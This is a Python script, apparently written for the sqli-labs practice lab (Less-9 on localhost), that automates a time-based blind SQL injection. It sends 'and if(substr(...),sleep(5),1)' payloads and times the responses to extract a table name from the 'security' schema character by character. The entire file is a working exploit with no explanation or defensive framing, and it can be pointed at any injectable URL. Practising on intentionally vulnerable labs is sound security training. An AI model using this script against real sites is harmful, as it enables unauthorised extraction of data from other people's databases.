# -*- coding: utf-8 -*-
import requests
import time
url = 'http://localhost/sqli-labs-master/Less-9/?id=1'
def check(payload):
	url_new = url + payload
	time_start = time.time()
	content = requests.get(url=url_new)
	time_end = time.time()
	if time_end - time_start >5:
		return 1
result  = ''
panduan = ''
ll=0
s = r'0123456789abcdefghijklmnopqrstuvwxyz'
for i in range(1,100):
    for c in s:
        payload = "'and if(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),%d,1)='%c',sleep(5),1)--+" % (i,c)
        print("Table_name name: "+result+" | Payload: "+payload)
        if check(payload):
            result += c
            break
    if ll==len(result):
    	print ('table_name:  '+result)
    ll = len(result)
    print (result)